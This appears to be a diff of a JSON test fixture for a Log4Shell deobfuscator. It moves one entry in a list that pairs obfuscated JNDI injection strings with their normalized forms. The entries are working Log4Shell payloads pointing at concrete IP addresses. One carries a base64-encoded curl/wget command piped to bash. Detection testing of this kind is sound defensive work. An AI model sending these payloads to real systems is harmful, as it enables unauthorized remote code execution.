@@ -1,5 +1,10 @@
 [
   {
+    "original": "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xNjEuMzUuNi44MTo4MHx8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC8xNjEuMzUuNi44MTo4MCl8YmFzaA==}",
+    "expected": "${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xNjEuMzUuNi44MTo4MHx8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC8xNjEuMzUuNi44MTo4MCl8YmFzaA==}",
+    "deobfusc": ""
+  },
+  {
     "original": "${${::-j}ndi:dns://45.83.64.1/securityscan-mqz6vcflt3ekussg}",
     "expected": "${jndi:dns://45.83.64.1/securityscan-mqz6vcflt3ekussg}",
     "deobfusc": ""
@@ -72,11 +77,6 @@
   {
     "original": "/search?a=$%7Bjndi:ldap://78.31.71.248:1389/8el8iu%7D",
     "expected": "/search?a=${jndi:ldap://78.31.71.248:1389/8el8iu}",
-    "deobfusc": ""
-  },
-  {
-    "original": "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xNjEuMzUuNi44MTo4MHx8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC8xNjEuMzUuNi44MTo4MCl8YmFzaA==}",
-    "expected": "${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xNjEuMzUuNi44MTo4MHx8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC8xNjEuMzUuNi44MTo4MCl8YmFzaA==}",
     "deobfusc": ""
   },
   {
